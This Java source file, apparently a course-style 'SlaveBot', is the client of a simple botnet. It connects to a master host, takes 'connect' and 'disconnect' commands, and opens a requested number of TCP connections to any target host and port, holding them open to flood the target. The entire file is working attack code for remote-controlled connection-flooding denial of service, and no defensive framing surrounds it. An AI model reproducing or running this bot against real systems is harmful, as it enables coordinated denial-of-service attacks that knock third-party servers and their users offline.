import java.net.*;
import java.io.*;
import java.util.*;

class Connection {
    Socket sock;
    String hostname;
    int port;
    Boolean disconnected;
}

public class SlaveBot {

    public static void main(String[] args) {

        Socket con = null;
        Socket s = null;
        BufferedReader nw_in = null;
        int remote_port = 0, num_con = 0;
        String remoteHost = null;
        String[] words;
        String command, arg3,arg4;

        ArrayList<Connection> connList = new ArrayList<Connection>();

        if (args.length < 4) {
            System.err.println("Usage: java Slave  -h <MasterIP|MasterHostname> -p <masterPort>");
            System.exit(-1);
        } 
        else if (!args[0].equalsIgnoreCase("-h") || !args[2].equalsIgnoreCase("-p")) {
            System.err.println("Usage java Slave -h <MasterIP | MasterHostname> -p <masterPort>");
            System.exit(-1);
        }

        System.out.println("\n");
        try {
            con = new Socket(args[1].toString(), Integer.parseInt(args[3]));
        }
        catch(Exception ex) {
            //Any reason the connection fails...
            System.err.println(ex);
            System.err.println("Connection Failed. Exiting...");
            System.exit(-1);
        }
        System.out.println("Connection Successful.");
        System.out.println("MasterIP: "+ args[1] + " MasterPort: "+ args[3] +" LocalPort: "+ con.getLocalPort());

        try {
            nw_in = new BufferedReader(new InputStreamReader(con.getInputStream()));

            while(true) {
                String line = nw_in.readLine();
                if (line == null || line.length() == 0) {
                    System.out.println("Disconnected from server");
                    break;
                }
                if (line.equals("Hello")) {
                    continue;
                }
                words = line.split("\\s+");
                command = words[0];
                remoteHost = words[1];
                arg3 = words[2];//remote port


                if (command.equalsIgnoreCase("connect")) {
                    arg4 = words[3]; //number of connections to be made to the remote server
                    System.out.println("\n[Command:"+ words[0]+"] [RemoreHost: "+remoteHost+":"+arg3+ "] [TotalConnections:"+arg4+"]  received.");
                    try {
                        remote_port = Integer.parseInt(arg3);
                        num_con = Integer.parseInt(arg4);
                    }
                    catch (Exception ex) {
                        System.err.println("Invalid value for targetPort OR numberOfConnections : " + arg3+" "+arg4);
                        System.err.println(ex);
                        continue;
                    }

                    for(int j=0;j<num_con;j++) {

                        //Create a connection to that target
                        try {
                            s = new Socket(remoteHost, remote_port);
                        }
                        catch (Exception ex) {
                            System.err.println(ex);
                            System.err.println("Failed to connect to remote Host at " + remoteHost + ":" + arg3);
                            System.err.println(ex);
                            continue;
                        }

                        System.out.println("Connected to: ("+ s.getInetAddress() + "):"+ s.getPort() +" LocalPort:"+ s.getLocalPort());

                        Connection c = new Connection();
                        c.sock = s;
                        c.hostname = remoteHost;
                        c.port = remote_port;
                        c.disconnected = false;
                        connList.add(c);
                    }
                    //We are done with this command. Lets go for next command
                    continue;
                }

                if (command.equalsIgnoreCase("disconnect")) {
                    System.out.println("\n[Command:"+ words[0]+"] [RemoreHost: "+remoteHost+":"+arg3+ "  received.");
                    remote_port = -1;
                    if (!arg3.equals("all")) {
                        try {
                            remote_port = Integer.parseInt(arg3);
                        }
                        catch (Exception ex) {
                            System.err.println("Invalid value for targetPort : " + arg3);
                            System.err.println(ex);
                            continue;
                        }
                    }

                    System.out.println("Disconnecting connections to " + remoteHost + " on " + arg3 + " port");
                    for (int j = 0; j < connList.size(); j++) {
                        Connection c = connList.get(j);
                        if (c.hostname.equals(remoteHost)) {
                            if (remote_port == -1 || c.port == remote_port) {
                                System.out.println("Disconnecting " + c.hostname + " " + c.port);
                                //Disconnect all connections
                                try {
                                    c.sock.close();
                                    c.disconnected = true;
                                } catch (IOException ex) {
                                    System.err.println("Failed to close the socket");
                                    System.err.println(ex);
                                }
                            } else {
                                System.out.println("Not Disconnecting " + c.hostname + " " + c.port);
                            }
                        } else {
                                System.out.println("Not Disconnecting " + c.hostname + " " + c.port);
                        }
                    }

                    //Remove all connections that are closed
                    ListIterator<Connection> it = connList.listIterator();
                    while(it.hasNext()) {
                        Connection cc = it.next();
                        if (cc.disconnected) {
                            it.remove();
                        }
                    }

                }

            }
        }
        catch(IOException ex) {
            System.err.println(ex);
        }
        finally {
            try {
                if(con != null) con.close();
                //if(nw_in != null) nw_in.close();
            }
            catch (IOException ex) {}
        }
    }
}
